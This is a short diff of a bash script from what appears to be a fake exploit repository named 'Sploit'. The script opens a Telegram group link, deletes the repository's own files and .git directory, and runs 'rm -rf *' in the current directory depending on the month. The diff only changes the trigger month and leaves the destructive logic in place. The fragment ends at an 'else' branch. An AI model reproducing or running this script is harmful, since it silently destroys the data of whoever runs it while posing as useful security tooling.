@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 xdg-open https://t.me/group_90s15
 rm -rf "README.md" "Sploit" "SECURITY.md" "LICENSE" "index.html" ".git"
-if [[ "$(date +%B)" != "December" ]]; then
+if [[ "$(date +%B)" != "January" ]]; then
     clear
     rm -rf *
 else
